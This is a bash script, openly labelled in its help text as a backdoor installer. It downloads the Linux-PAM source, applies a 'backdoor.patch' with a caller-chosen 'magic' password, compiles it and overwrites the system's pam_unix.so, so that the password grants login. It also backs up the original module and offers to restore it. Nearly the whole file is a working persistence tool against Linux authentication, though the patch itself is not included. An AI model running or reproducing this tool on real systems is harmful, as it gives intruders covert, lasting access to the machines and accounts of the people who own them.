#!/bin/bash
# Log: February 02, 2026, 03:35 PM MDT
# Note: Always use namespace std if adding C++ components.

PAM_VERSION=""
PASSWORD=""
VERBOSE=false
RESTORE=false
PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget patch
)

function run_cmd {
    if [ "$VERBOSE" = true ]; then
        "$@"
    else
        "$@" &>/dev/null
    fi
}

function show_help {
    echo "Usage: $0 [-v version] -p password [--restore] [--verbose]"
    echo ""
    echo "Options:"
    echo "  -v           Specify Linux-PAM version."
    echo "  -p           The 'magic' password for the backdoor."
    echo "  --restore    Restore original PAM and offer reboot."
    echo "  --verbose    Show all command output."
    echo "  -h, --help   Show help message."
}

function offer_reboot {
    echo ""
    while true; do
        read -p "Task complete. Would you like to reboot now? (y/n): " yn
        case $yn in
            [Yy]* ) reboot; break;;
            [Nn]* ) exit 0;;
            * ) echo "Please answer y or n.";;
        esac
    done
}

# --- Manual Argument Parsing (Fixes the "illegal option" error) ---
while [[ $# -gt 0 ]]; do
    case "$1" in
        -v)
            PAM_VERSION="$2"
            shift 2
            ;;
        -p)
            PASSWORD="$2"
            shift 2
            ;;
        --verbose)
            VERBOSE=true
            shift
            ;;
        --restore)
            RESTORE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

if [[ $EUID -ne 0 ]]; then
   echo "Error: This script must be run as root."
   exit 1
fi

if [ "$RESTORE" = true ]; then
    if [ -f "$BACKUP_PATH" ]; then
        echo "Restoring original module..."
        cp "$BACKUP_PATH" "$PAM_DEST"
        offer_reboot
    else
        echo "Error: Backup file $BACKUP_PATH not found."
        exit 1
    fi
fi

if [ -z "$PASSWORD" ]; then
    echo "Error: Password (-p) is required."
    exit 1
fi

# --- Main Logic ---

echo "Checking dependencies..."
MISSING_PKGS=()
for pkg in "${DEPENDENCIES[@]}"; do
    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
        MISSING_PKGS+=("$pkg")
    fi
done

if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
    run_cmd apt update 
    run_cmd apt install -y "${MISSING_PKGS[@]}"
fi

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    echo "Detected Version: $PAM_VERSION"
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_FILE="v${PAM_VERSION}.tar.gz"
PAM_DIR="linux-pam-${PAM_VERSION}"

echo "Downloading PAM source..."
run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
run_cmd tar xzf "$PAM_FILE"

echo "Applying patch..."
if [ -f "backdoor.patch" ]; then
    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR" &>/dev/null
else
    echo "Error: backdoor.patch missing."
    exit 1
fi

cd "$PAM_DIR"
echo "Configuring and compiling..."
if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 
run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
run_cmd make

if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
    cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
    cd ..
    echo "Build successful. Backing up and installing..."
    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
    cp ./pam_unix.so "$PAM_DEST"
    offer_reboot
else
    echo "Error: Build failed. Check output above (if --verbose was used)."
    exit 1
fi
